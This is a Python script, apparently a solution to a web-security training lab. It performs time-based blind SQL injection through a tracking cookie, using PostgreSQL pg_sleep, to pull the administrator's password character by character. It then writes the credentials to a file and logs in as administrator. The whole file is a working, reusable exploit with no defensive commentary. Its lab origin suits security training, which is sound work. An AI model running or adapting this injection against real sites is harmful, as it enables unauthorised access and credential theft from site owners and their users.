import re

import requests
import bruteforce as bf

URL = 'https://ace01f5c1e98f62ec0e368c5001e0079.web-security-academy.net/login'

status_code = requests.get(url=URL).status_code
if status_code != 200:
    print(f'Status code: {status_code}')
    exit(status_code)

bf_char = bf.ALLOWED_CHARACTERS[0]
pos = 1
username = 'administrator'
password = ''
while bf_char != bf.ALLOWED_CHARACTERS[-1]:
    cookie = {
        'TrackingId': f"'%3b SELECT CASE WHEN ((select substring(password,{pos},1) from users where username = '{username}') = '{bf_char}') THEN pg_sleep(15) ELSE pg_sleep(0) END -- "
    }
    res = requests.get(url=URL, cookies=cookie)

    print(f'{bf_char} - ', end='')

    if res.elapsed.total_seconds() > 14:
        print(f'password: {bf_char}')
        password += bf_char
        pos += 1
        bf_char = bf.ALLOWED_CHARACTERS[0]
    else:
        bf_char = bf.func_next_char(bf_char)

print(password)
with open('credential.txt', 'w') as file:
    file.write(f'{username}:{password}')

s = requests.session()
csrf = re.search(r'<input required type="hidden" name="csrf" value="(.*)">', s.get(url=URL).text).group(1)

data = {
    'csrf': csrf,
    'username': username,
    'password': password
}

res = s.post(url=URL, data=data, allow_redirects=True)

if f'Your username is: {username}' in res.text:
    print(f"Logged in as {username}")
    with open('admin.html', 'w') as file:
        file.write(res.text)
else:
    print('Login error')
